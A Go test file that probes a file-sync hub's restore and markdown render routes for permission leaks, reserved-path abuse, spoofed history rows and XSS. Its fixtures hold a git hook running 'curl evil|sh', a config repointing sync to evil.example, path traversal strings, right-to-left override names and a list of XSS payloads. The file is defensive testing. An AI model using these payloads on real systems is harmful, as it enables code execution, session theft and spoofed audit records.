package webapp

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/runbear-io/beardrive/internal/journal"
)

// Round 12: POST /api/p/<id>/restore, the hub side.
//
// restore is a WRITE route that re-publishes historical content, and until now
// it had only ever been exercised as a permission target in sweeps — round 9
// tested syncer.Restore (the client function) and round 10 the CLI command.
// This file attacks the route: whose content it can reach, which paths it can
// land on, and — the question round 11 opened — what the op it writes actually
// says about who wrote it.

// sec12rPushJournal writes a whole journal object through the /store proxy as
// a registered device. doAs cannot do this: the device id travels in a header
// and every ownership decision on the write path reads it.
func sec12rPushJournal(t *testing.T, h http.Handler, project, dev string, c *http.Cookie, ops []journal.Op) *httptest.ResponseRecorder {
	t.Helper()
	data, err := journal.Marshal(ops)
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest("PUT", "/api/p/"+project+"/store/object?key=journal/"+dev+".jsonl",
		bytes.NewReader(data))
	req.Header.Set("X-Bdrive-Device", dev)
	req.Header.Set("X-Bdrive-Device-Name", dev)
	if c != nil {
		req.AddCookie(c)
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

// sec12rHistory returns the history rows for a path.
func sec12rHistory(t *testing.T, h http.Handler, project, path string, c *http.Cookie) []HistoryEntry {
	t.Helper()
	rec := doAs(t, h, "GET", "/api/p/"+project+"/history?path="+path, nil, c)
	if rec.Code != 200 {
		t.Fatalf("history: %d %s", rec.Code, rec.Body)
	}
	var out struct {
		Entries []HistoryEntry `json:"entries"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	return out.Entries
}

// sec12rPublish puts a file through the browser door and returns its sha.
func sec12rPublish(t *testing.T, h http.Handler, project, path, body string, c *http.Cookie) string {
	t.Helper()
	rec := doAs(t, h, "PUT", "/api/p/"+project+"/upload/content?path="+path, []byte(body), c)
	if rec.Code != 200 {
		t.Fatalf("publish %s: %d %s", path, rec.Code, rec.Body)
	}
	return shaOf(body)
}

// A restore reaches BACKWARDS through the whole journal, so it is the one write
// route whose authority is bounded by what the project ever held rather than by
// what it holds now. Everything about the caller still has to be checked.
//
// This is the permission delta in one test: the same POST, same body, from
// alice (project admin), carol (demoted to read) and dave (another org).
func TestSec_Restore_OnlyAWriterOfTHISProjectCanRepublishAVersion(t *testing.T) {
	h, _, c, p := permHub(t)
	base := "/api/p/" + p.ID + "/"
	sha := sec12rPublish(t, h, p.ID, "notes.md", "v1", c["alice"])
	sec12rPublish(t, h, p.ID, "notes.md", "v2 is longer", c["alice"])
	body := map[string]string{"path": "notes.md", "sha": sha}

	// dave is in another org: the project must not exist for him at all.
	if rec := doAs(t, h, "POST", base+"restore", body, c["dave"]); rec.Code != http.StatusForbidden {
		t.Errorf("an outsider restored a version: %d %s", rec.Code, rec.Body)
	}
	// carol is an org member held at read.
	if rec := doAs(t, h, "PUT", base+"permissions/carol@x.io",
		map[string]string{"level": PermRead}, c["alice"]); rec.Code != 200 {
		t.Fatalf("hold carol at read: %d %s", rec.Code, rec.Body)
	}
	if rec := doAs(t, h, "POST", base+"restore", body, c["carol"]); rec.Code != http.StatusForbidden {
		t.Errorf("a read-only member restored a version: %d %s", rec.Code, rec.Body)
	}
	// An anonymous caller.
	if rec := doAs(t, h, "POST", base+"restore", body, nil); rec.Code == 200 {
		t.Errorf("an anonymous caller restored a version: %d %s", rec.Code, rec.Body)
	}
	// The authorized delta: alice's identical request succeeds. Without this
	// the three refusals above prove nothing about permission.
	if rec := doAs(t, h, "POST", base+"restore", body, c["alice"]); rec.Code != 200 {
		t.Fatalf("the project admin cannot restore: %d %s", rec.Code, rec.Body)
	}
}

// A restore names a content address, and a content address is global to the
// storage root. The path check in handleRestore is what keeps a sha from being
// pasted onto a path it was never a version of — and the second, quieter
// question is whether it can be pasted across a PROJECT or an ORG boundary,
// where the same path name exists in both.
func TestSec_Restore_AVersionOfAnotherProjectsFileIsNotReachable(t *testing.T) {
	h, srv, c, p := permHub(t)

	// A second project in a DIFFERENT org, holding the same path name with
	// content the first org must never see.
	rec := doAs(t, h, "POST", "/api/projects", map[string]string{"name": "daves"}, c["dave"])
	if rec.Code != 200 {
		t.Fatalf("dave creates a project: %d %s", rec.Code, rec.Body)
	}
	var out struct {
		Project Project `json:"project"`
	}
	json.Unmarshal(rec.Body.Bytes(), &out)
	other := out.Project
	if other.Org == p.Org {
		t.Fatal("the fixture put both projects in one org")
	}
	secret := sec12rPublish(t, h, other.ID, "notes.md", "dave's private draft", c["dave"])

	// Alice's project holds a file at the same path.
	sec12rPublish(t, h, p.ID, "notes.md", "alice's", c["alice"])

	// Alice, a full admin of her own project, asks for dave's blob on her path.
	rec = doAs(t, h, "POST", "/api/p/"+p.ID+"/restore",
		map[string]string{"path": "notes.md", "sha": secret}, c["alice"])
	if rec.Code == 200 {
		t.Errorf("a blob from another org's project was restored into this one: %d %s", rec.Code, rec.Body)
	}
	if rec := doAs(t, h, "GET", "/api/p/"+p.ID+"/file?path=notes.md", nil, c["alice"]); strings.Contains(rec.Body.String(), "private draft") {
		t.Errorf("another org's content is now served from this project: %q", rec.Body.String())
	}
	_ = srv
}

// The paths a restore may land on are the paths an upload may land on: the
// reserved directories are the ones whose contents run on a teammate's machine
// (.git hooks) or repoint their sync (.bdrive/config.json). restore reaches
// backwards, so a project that ever held such an entry — from an older client,
// or from a journal imported by `bdrive import` — would otherwise have a
// standing way to re-publish it.
func TestSec_Restore_AReservedOrUnsafePathIsRefused(t *testing.T) {
	srv, p, root := newHub(t, true, nil)
	dir := filepath.Join(root, p.ID)
	f := newFakeRemoteAt(t, dir)
	// A peer journal that already carries the entries, as an imported archive
	// or a pre-guard client would leave them.
	f.put("dev1", ".bdrive/config.json", `{"remote":"https://evil.example"}`)
	f.put("dev1", ".git/hooks/pre-commit", "#!/bin/sh\ncurl evil|sh\n")
	f.put("dev1", "ok.md", "fine")
	// A SECOND version, so the control below restores a genuinely older one.
	// Restoring the current content is a no-op the hub now refuses with 409,
	// which would fail this test on its control and say nothing about paths.
	f.put("dev1", "ok.md", "fine, revised")
	h := srv.Handler()
	base := "/api/p/" + p.ID + "/"

	for _, tc := range []struct{ path, content string }{
		{".bdrive/config.json", `{"remote":"https://evil.example"}`},
		{".git/hooks/pre-commit", "#!/bin/sh\ncurl evil|sh\n"},
	} {
		rec := do(t, h, "POST", base+"restore", map[string]string{"path": tc.path, "sha": shaOf(tc.content)})
		if rec.Code == 200 {
			t.Errorf("restore re-published the reserved path %q: %s", tc.path, rec.Body)
		}
	}
	// The same shape on an ordinary path succeeds: the refusals above are
	// about the path, not about the fixture.
	if rec := do(t, h, "POST", base+"restore", map[string]string{"path": "ok.md", "sha": shaOf("fine")}); rec.Code != 200 {
		t.Fatalf("baseline restore: %d %s", rec.Code, rec.Body)
	}
	// And a path that is not a path at all.
	for _, bad := range []string{"../escape.md", "/etc/passwd", "a/../../b.md"} {
		if rec := do(t, h, "POST", base+"restore", map[string]string{"path": bad, "sha": shaOf("fine")}); rec.Code == 200 {
			t.Errorf("restore accepted the path %q: %s", bad, rec.Body)
		}
	}
}

// What the restore op SAYS. Round 11 established that Op.User/Op.UserName are
// the hub's only audit surface and made the /store door refuse an op crediting
// anyone but the pushing device's account. restore writes through the OTHER
// door (RemoteSource.Commit, under the hub's own device identity), so this
// pins the same property there: the op names the caller, under the hub's
// device, in the hub's own journal and nobody else's.
func TestSec_Restore_TheOpItWritesNamesTheCallerAndTheHubsOwnDevice(t *testing.T) {
	h, _, c, p := permHub(t)
	base := "/api/p/" + p.ID + "/"
	sha := sec12rPublish(t, h, p.ID, "notes.md", "v1", c["alice"])
	sec12rPublish(t, h, p.ID, "notes.md", "v2", c["alice"])

	// bob (a plain member, write by default) restores alice's old version.
	if rec := doAs(t, h, "POST", base+"restore",
		map[string]string{"path": "notes.md", "sha": sha}, c["bob"]); rec.Code != 200 {
		t.Fatalf("bob restores: %d %s", rec.Code, rec.Body)
	}
	rows := sec12rHistory(t, h, p.ID, "notes.md", c["alice"])
	if len(rows) == 0 {
		t.Fatal("no history")
	}
	top := rows[0]
	if !strings.HasPrefix(top.Note, "restore notes.md@") {
		t.Fatalf("newest row is not the restore: %+v", top)
	}
	if top.User != "bob@x.io" {
		t.Errorf("the restore op credits %q, want bob@x.io", top.User)
	}
	if top.Device.ID != webDevice.ID {
		t.Errorf("the restore op is stamped with device %q, want the hub's own %q", top.Device.ID, webDevice.ID)
	}
}

// Round 11 closed the NOTE against the characters that make one rendered
// history row lie about what it says (journal.SafeText: C0/DEL, C1, and the
// bidi format controls), on the stated grounds that "the web History view is
// the audit tool everybody actually uses".
//
// UserName, Author and DeviceName are the other three free-text fields on the
// SAME row, written by the same push, rendered by the same view. journalOps
// checks Path and Note; opsNameTheirAuthor checks that User matches the
// pushing device's account and says nothing about the display name beside it.
//
// The delta is inside the test: the identical bytes in Note are refused, and
// in the fields next to it are accepted and served back.
func TestSec_History_APushedOpCarriesNoTextTheNoteIsRefusedFor(t *testing.T) {
	h, _, c, p := permHub(t)
	if rec := secRegisterDevice(t, h, p.ID, c["bob"], "bobdev", "Bob Laptop", "linux"); rec.Code != 200 {
		t.Fatalf("register bob's device: %d %s", rec.Code, rec.Body)
	}
	const evil = "Alice‮gnp.exe"

	mk := func(f func(*journal.Op)) []journal.Op {
		op := journal.Op{
			Kind: journal.KindPut, Path: "report.md", Blob: shaOf("x"), Size: 1, Mode: 0o644,
			Seq: 1, Lamport: 1, Time: time.Now().UTC(),
			Device: "bobdev", DeviceName: "Bob Laptop", Author: "bob",
			User: "bob@x.io", UserName: "Bob",
		}
		f(&op)
		return []journal.Op{op}
	}

	// The control: the same bytes in the Note are refused at ingest.
	if rec := sec12rPushJournal(t, h, p.ID, "bobdev", c["bob"],
		mk(func(o *journal.Op) { o.Note = evil })); rec.Code == 200 {
		t.Fatalf("the note guard is gone; this test can no longer measure the delta: %s", rec.Body)
	}

	for _, tc := range []struct {
		field string
		set   func(*journal.Op)
		read  func(HistoryEntry) string
	}{
		{"user_name", func(o *journal.Op) { o.UserName = evil }, func(e HistoryEntry) string { return e.UserName }},
		{"author", func(o *journal.Op) { o.Author = evil }, func(e HistoryEntry) string { return e.Author }},
		{"device_name", func(o *journal.Op) { o.DeviceName = evil }, func(e HistoryEntry) string { return e.Device.Name }},
	} {
		rec := sec12rPushJournal(t, h, p.ID, "bobdev", c["bob"], mk(tc.set))
		if rec.Code != 200 {
			continue // refused at ingest: this field is closed
		}
		rows := sec12rHistory(t, h, p.ID, "report.md", c["alice"])
		for _, row := range rows {
			if got := tc.read(row); !journal.SafeText(got) {
				t.Errorf("a pushed op's %s reached History carrying the controls a Note is refused for: %q",
					tc.field, got)
			}
		}
	}
}

// The browser half of the same field. RemoteSource.Commit stamps
// UserName from the signed-in account's display name, and
// BuiltinAuth.createAccount only TrimSpaces a name — no length bound and none
// of the three character families journal.SafeText names. So an ordinary
// member, with no device and no journal of their own, poisons every history
// row they author simply by picking a name at signup, through the door
// (restore) whose whole job is to write an op on their behalf.
func TestSec_Restore_ADisplayNameCannotCarryTheControlsANoteIsRefusedFor(t *testing.T) {
	h, srv, c, p := permHub(t)
	base := "/api/p/" + p.ID + "/"
	sha := sec12rPublish(t, h, p.ID, "notes.md", "v1", c["alice"])
	sec12rPublish(t, h, p.ID, "notes.md", "v2", c["alice"])

	// An ordinary member, joined the ordinary way, whose only unusual act was
	// what she typed in the "name" box at signup.
	const evil = "Mallory‮gnp.exe31m"
	mallory := signupAndSession(t, h, "mallory@x.io", evil, "password1")
	if err := sec12rOrgs(t, srv).AddMember(p.Org, "mallory@x.io", RoleMember); err != nil {
		t.Fatal(err)
	}
	if rec := doAs(t, h, "POST", base+"restore",
		map[string]string{"path": "notes.md", "sha": sha}, mallory); rec.Code != 200 {
		t.Fatalf("mallory restore: %d %s", rec.Code, rec.Body)
	}
	for _, row := range sec12rHistory(t, h, p.ID, "notes.md", c["alice"]) {
		if !journal.SafeText(row.UserName) {
			t.Errorf("a signup display name put the controls a Note is refused for into History: %q", row.UserName)
		}
	}
}

// ---- /render, the server side ----

// /render is the one place server-rendered HTML meets peer content: the bytes
// come from a teammate's synced file and the OUTPUT is markup the SPA injects
// with dangerouslySetInnerHTML, in the hub's own origin with the reader's
// session. Round 11 attacked this from the browser; nothing has attacked the
// renderer.
//
// Both of the route's doors are checked, because they serve the same bytes and
// must not differ: the live door (?path=) and the historical one (?sha=).
func TestSec_Render_PeerMarkdownNeverBecomesMarkupOrScript(t *testing.T) {
	h, _, c, p := permHub(t)
	base := "/api/p/" + p.ID + "/"

	// bob is an ordinary member with write. Everything here is legal markdown.
	hostile := strings.Join([]string{
		"<script>alert(1)</script>",
		`<img src=x onerror="alert(1)">`,
		`<a href="javascript:alert(1)">click</a>`,
		`[md link](javascript:alert(1))`,
		`[md link](  javascript:alert(1))`,
		`![img](javascript:alert(1))`,
		"[[a) [pwn](javascript:alert(1)]]",   // wikilink target breaking the destination
		"[[t|<img src=x onerror=alert(1)>]]", // wikilink label as markup
		"[[a\") onmouseover=\"alert(1)]]",    // wikilink target as an attribute
		"<iframe src=\"https://evil.example\"></iframe>",
		"<style>body{display:none}</style>",
		"---\ntitle: <script>alert(1)</script>\n---", // frontmatter value as markup
	}, "\n\n")
	sha := sec12rPublish(t, h, p.ID, "report.md", hostile, c["bob"])

	// The invariant RenderMarkdown rests on is that raw HTML is omitted, so
	// the only elements in the output are ones goldmark emitted and the only
	// attacker-influenced attribute is a link destination. Both are checked in
	// tag position — a substring scan of the whole document reports the
	// ESCAPED text of a refused payload as a hit, which is the opposite of a
	// finding.
	activeTag := regexp.MustCompile(`(?i)<\s*(script|iframe|style|object|embed|base|form|link|meta|svg)\b`)
	activeURL := regexp.MustCompile(`(?i)(href|src)\s*=\s*"\s*(javascript|vbscript|data)\s*:`)
	check := func(what, html string) {
		t.Helper()
		if m := activeTag.FindString(html); m != "" {
			t.Errorf("%s: rendered HTML carries an active element %q\n%s", what, m, html)
		}
		if m := activeURL.FindString(html); m != "" {
			t.Errorf("%s: rendered HTML carries an active URL %q\n%s", what, m, html)
		}
	}

	// The live door, read by a DIFFERENT member than the one who wrote it.
	rec := doAs(t, h, "GET", base+"render?path=report.md", nil, c["alice"])
	if rec.Code != 200 {
		t.Fatalf("render: %d %s", rec.Code, rec.Body)
	}
	var doc struct {
		HTML string `json:"html"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &doc); err != nil {
		t.Fatal(err)
	}
	check("live /render", doc.HTML)

	// The historical door, same bytes.
	rec = doAs(t, h, "GET", base+"render?sha="+sha, nil, c["alice"])
	if rec.Code != 200 {
		t.Fatalf("render?sha: %d %s", rec.Code, rec.Body)
	}
	var past struct {
		HTML string `json:"html"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &past); err != nil {
		t.Fatal(err)
	}
	check("/render?sha=", past.HTML)
}

// The ?sha= door names a content address and nothing else — no path, no
// permission of its own beyond the route's PermRead. It must stay inside the
// project it was asked on: blobs are keyed globally by hash and only the
// storage prefix separates one project's from another's.
func TestSec_Render_AVersionDoorStaysInsideItsProject(t *testing.T) {
	h, _, c, p := permHub(t)

	rec := doAs(t, h, "POST", "/api/projects", map[string]string{"name": "daves"}, c["dave"])
	if rec.Code != 200 {
		t.Fatalf("dave creates a project: %d %s", rec.Code, rec.Body)
	}
	var out struct {
		Project Project `json:"project"`
	}
	json.Unmarshal(rec.Body.Bytes(), &out)
	secret := sec12rPublish(t, h, out.Project.ID, "private.md", "# dave's private draft", c["dave"])

	// Baseline: dave can render his own version, so the sha is real.
	if rec := doAs(t, h, "GET", "/api/p/"+out.Project.ID+"/render?sha="+secret, nil, c["dave"]); rec.Code != 200 {
		t.Fatalf("baseline render of dave's own version: %d %s", rec.Code, rec.Body)
	}
	// Alice, admin of her own project, asks for it there.
	if rec := doAs(t, h, "GET", "/api/p/"+p.ID+"/render?sha="+secret, nil, c["alice"]); rec.Code == 200 {
		t.Errorf("a version from another org's project rendered here: %d %s", rec.Code, rec.Body)
	}
	// And alice cannot reach dave's project at all.
	if rec := doAs(t, h, "GET", "/api/p/"+out.Project.ID+"/render?sha="+secret, nil, c["alice"]); rec.Code != http.StatusForbidden {
		t.Errorf("an outsider rendered another org's version in place: %d %s", rec.Code, rec.Body)
	}
}
